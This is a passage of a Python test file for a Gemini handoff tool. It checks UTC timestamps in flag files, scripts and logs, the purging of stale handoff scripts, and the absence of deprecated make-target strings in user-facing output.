    """Flag file ts= line must contain UTC offset (+00:00) — W-NEW-1 fix."""
    captured = StringIO()
    with patch("sys.stdout", captured):
        handoff.handoff(
            ticket_id="T-OSN-UTC-FLAG",
            prompt="UTC test",
            image_paths=[],
        )
    flag = project_root / "devos" / "state" / "gemini_pending_T-OSN-UTC-FLAG.flag"
    content = flag.read_text(encoding="utf-8")
    assert "+00:00" in content, (
        f"Flag file must contain UTC offset (+00:00) in ts= line (W-NEW-1 fix). "
        f"Got: {content!r}"
    )


def test_handoff_script_header_timestamp_is_utc(handoff: GeminiHandoff, project_root: Path):
    """Generated .sh script '# Generated:' line must contain UTC offset (+00:00) — W-NEW-1 fix."""
    captured = StringIO()
    with patch("sys.stdout", captured):
        handoff.handoff(
            ticket_id="T-OSN-UTC-SCRIPT",
            prompt="UTC script test",
            image_paths=[],
        )
    script = project_root / ".cache" / "gemini-handoff-T-OSN-UTC-SCRIPT.sh"
    content = script.read_text(encoding="utf-8")
    # Find the Generated: line
    generated_lines = [ln for ln in content.splitlines() if "Generated:" in ln]
    assert generated_lines, "Script must have a '# Generated:' line"
    assert "+00:00" in generated_lines[0], (
        f"Script Generated: line must contain UTC offset (+00:00) (W-NEW-1 fix). "
        f"Got: {generated_lines[0]!r}"
    )


def test_ingest_log_date_line_is_utc(handoff: GeminiHandoff, project_root: Path):
    """Ingest log **Date**: line must contain UTC offset (+00:00) — W-NEW-1 fix."""
    flag = project_root / "devos" / "state" / "gemini_pending_T-OSN-UTC-LOG.flag"
    flag.write_text("pending", encoding="utf-8")

    handoff.ingest(ticket_id="T-OSN-UTC-LOG", response="Test response for UTC check.")

    log_dir = project_root / "devos" / "logs" / "gemini"
    logs = list(log_dir.glob("*T-OSN-UTC-LOG.md"))
    assert logs, "Ingest log must be created"
    content = logs[0].read_text(encoding="utf-8")
    # Find **Date**: line
    date_lines = [ln for ln in content.splitlines() if "**Date**:" in ln]
    assert date_lines, "Log must have a **Date**: line"
    assert "+00:00" in date_lines[0], (
        f"Log **Date**: line must contain UTC offset (+00:00) (W-NEW-1 fix). "
        f"Got: {date_lines[0]!r}"
    )


def test_ingest_log_filename_uses_utc_date(handoff: GeminiHandoff, project_root: Path):
    """Log filename date prefix must be derived from UTC — W-NEW-1 fix.

    We patch datetime.now to return a known UTC time and verify the log filename
    uses that date, confirming the code calls datetime.now(tz=timezone.utc).
    """
    from datetime import datetime as _dt, timezone as _tz
    import server.gemini_handoff as _gh_module

    flag = project_root / "devos" / "state" / "gemini_pending_T-OSN-UTC-FNAME.flag"
    flag.write_text("pending", encoding="utf-8")

    # Patch datetime in the module under test to return a known UTC datetime
    fixed_utc = _dt(2026, 1, 15, 3, 30, 0, tzinfo=_tz.utc)

    class _FixedDatetime(_dt):
        @classmethod
        def now(cls, tz=None):
            if tz is not None:
                return fixed_utc
            # naive call (should not happen after W-NEW-1 fix)
            return fixed_utc.replace(tzinfo=None)

    with patch.object(_gh_module, "datetime", _FixedDatetime):
        handoff.ingest(ticket_id="T-OSN-UTC-FNAME", response="UTC filename test.")

    log_dir = project_root / "devos" / "logs" / "gemini"
    logs = list(log_dir.glob("*T-OSN-UTC-FNAME.md"))
    assert logs, "Ingest log must be created"
    assert logs[0].name.startswith("2026-01-15"), (
        f"Log filename must use UTC date '2026-01-15' (W-NEW-1 fix). "
        f"Got filename: {logs[0].name!r}"
    )


# ---------------------------------------------------------------------------
# WARNING: _purge_old_handoffs — stale cleanup (R3)
# ---------------------------------------------------------------------------

def test_purge_old_handoffs_removes_stale_scripts(project_root: Path):
    """_purge_old_handoffs must delete .sh files older than max_age_days."""
    import time

    h = GeminiHandoff(project_root=project_root)
    cache_dir = project_root / ".cache"

    # Create a stale handoff script (mtime 8 days ago)
    stale = cache_dir / "gemini-handoff-T-STALE-01.sh"
    stale.write_text("#!/bin/bash\n# stale script\n", encoding="utf-8")
    old_mtime = time.time() - 8 * 86400  # 8 days ago
    os.utime(stale, (old_mtime, old_mtime))

    h._purge_old_handoffs(max_age_days=7)

    assert not stale.exists(), (
        "Stale handoff script (8 days old) must be deleted by _purge_old_handoffs"
    )


def test_purge_old_handoffs_preserves_recent_scripts(project_root: Path):
    """_purge_old_handoffs must NOT delete .sh files newer than max_age_days."""
    h = GeminiHandoff(project_root=project_root)
    cache_dir = project_root / ".cache"

    # Create a recent script (mtime now)
    recent = cache_dir / "gemini-handoff-T-RECENT-01.sh"
    recent.write_text("#!/bin/bash\n# recent script\n", encoding="utf-8")

    h._purge_old_handoffs(max_age_days=7)

    assert recent.exists(), (
        "Recent handoff script must NOT be deleted by _purge_old_handoffs"
    )


def test_purge_old_handoffs_does_not_touch_non_handoff_files(project_root: Path):
    """_purge_old_handoffs must only remove gemini-handoff-*.sh files.

    Other .cache files (smoke caches, arg tmp files) must not be removed.
    """
    import time

    h = GeminiHandoff(project_root=project_root)
    cache_dir = project_root / ".cache"

    # Create an old non-handoff file (e.g. smoke cache)
    other = cache_dir / "gemini-smoke-gemini-3.1-pro-preview.ok"
    other.write_text("ok\n", encoding="utf-8")
    old_mtime = time.time() - 8 * 86400
    os.utime(other, (old_mtime, old_mtime))

    # Create an old non-.sh file
    other2 = cache_dir / "handoff-args-12345.tmp"
    other2.write_text("arg data\n", encoding="utf-8")
    os.utime(other2, (old_mtime, old_mtime))

    h._purge_old_handoffs(max_age_days=7)

    assert other.exists(), (
        "Non-handoff cache file (smoke .ok) must NOT be removed by _purge_old_handoffs"
    )
    assert other2.exists(), (
        "Non-handoff .tmp file must NOT be removed by _purge_old_handoffs"
    )


def test_purge_old_handoffs_is_called_on_handoff(handoff: GeminiHandoff, project_root: Path):
    """handoff() must call _purge_old_handoffs() before processing (non-fatal cleanup)."""
    import time

    cache_dir = project_root / ".cache"
    # Create a stale handoff script
    stale = cache_dir / "gemini-handoff-T-PURGE-CALL.sh"
    stale.write_text("#!/bin/bash\n", encoding="utf-8")
    old_mtime = time.time() - 8 * 86400
    os.utime(stale, (old_mtime, old_mtime))

    captured = StringIO()
    with patch("sys.stdout", captured):
        handoff.handoff(
            ticket_id="T-OSN-PURGE-01",
            prompt="test purge",
            image_paths=[],
        )

    assert not stale.exists(), (
        "handoff() must call _purge_old_handoffs() — stale script must be cleaned up"
    )


# ---------------------------------------------------------------------------
# R7 regression: no make gemini-* in user-facing print/stderr strings
# ---------------------------------------------------------------------------

def test_no_make_gemini_in_user_facing_strings():
    """R7 regression — make gemini-* literal must not appear in user-facing print/stderr.

    Scans server/gemini_handoff.py and server/gemini_dispatcher.py source for
    the forbidden patterns. A substring match on the source file is used.
    Comments/docstrings are excluded via line-prefix heuristics — only lines
    that could be part of a string literal passed to print() or sys.stderr are
    checked via the broader substring scan.

    This test exists to prevent regression where a future edit re-introduces
    old Make target guidance in user-visible output.
    """
    import ast
    import re

    FORBIDDEN = [
        "make gemini-next",
        "make gemini-ingest",
        "make gemini-pending",
        "make gemini-status",
    ]

    project_root = Path(__file__).parent.parent
    handoff_src = (project_root / "server" / "gemini_handoff.py").read_text(encoding="utf-8")
    dispatcher_src = (project_root / "server" / "gemini_dispatcher.py").read_text(encoding="utf-8")

    def _string_literals_from_source(src: str) -> list[str]:
        """Extract string literal values from Python source via AST walk."""
        try:
            tree = ast.parse(src)
        except SyntaxError:
            return []
        literals = []
        for node in ast.walk(tree):
            if isinstance(node, ast.Constant) and isinstance(node.value, str):
                literals.append(node.value)
        return literals

    for label, src in [("gemini_handoff.py", handoff_src), ("gemini_dispatcher.py", dispatcher_src)]:
        literals = _string_literals_from_source(src)
        combined = "\n".join(literals)
        for forbidden in FORBIDDEN:
            assert forbidden not in combined, (
                f"R7 regression: '{forbidden}' found in a string literal in {label}. "
                f"User-facing print/stderr must use 'python3 -m server.gemini_handoff <subcommand>' instead."
            )
